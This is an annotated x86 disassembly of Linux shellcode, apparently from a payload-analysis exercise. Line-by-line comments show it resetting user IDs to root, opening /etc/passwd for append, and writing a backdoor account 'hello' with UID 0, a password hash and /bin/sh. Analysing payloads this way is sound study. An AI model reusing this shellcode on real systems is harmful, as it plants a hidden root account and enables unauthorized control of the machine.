00000000  31C9              xor ecx,ecx 				; ecx = 0 (euid - effective uid)
00000002  89CB              mov ebx,ecx 				; ebx = 0 (ruid - real user uid)
00000004  6A46              push byte +0x46 			
00000006  58                pop eax						; eax = 70 (decimal)
00000007  CD80              int 0x80					; syscall (sys_setreuid) - sets real and effective user IDs of the calling process
00000009  6A05              push byte +0x5 				
0000000B  58                pop eax						; eax = 5
0000000C  31C9              xor ecx,ecx 				; ecx = 0
0000000E  51                push ecx 					; stack <-0
0000000F  6873737764        push dword 0x64777373		; stack <-0, dwss,
00000014  682F2F7061        push dword 0x61702f2f		; stack <-0, dwss, ap//
00000019  682F657463        push dword 0x6374652f		; stack <-0, dwss, ap//, cte/
0000001E  89E3              mov ebx,esp 				; ebx= "/etc//passwd"
00000020  41                inc ecx 					; ecx = 1
00000021  B504              mov ch,0x4 					; ecx = 0x401
00000023  CD80              int 0x80					; syscall (sys_open) - open /etc/passwd to append a new user
00000025  93                xchg eax,ebx				; stores the file descriptor (0=standard input) into ebx
00000026  E823000000        call dword 0x4e				; call the code at offset 0x4e


...
00000026  E823000000        call dword 0x4e
0000002B  skipping 0x23 bytes
0000004E  59                pop ecx 					; ecx = 'hello:AzLNA/HC3eOH2:0:0::/:/bin/sh\n'
0000004F  8B51FC            mov edx,[ecx-0x4]			; edx = 0x2B - 4 = 0x27
00000052  6A04              push byte +0x4 				
00000054  58                pop eax						; eax = 4
00000055  CD80              int 0x80					; syscall (sys_write) 
00000057  6A01              push byte +0x1 				
00000059  58                pop eax						; eax = 1
0000005A  CD80              int 0x80					; syscall (sys_exit)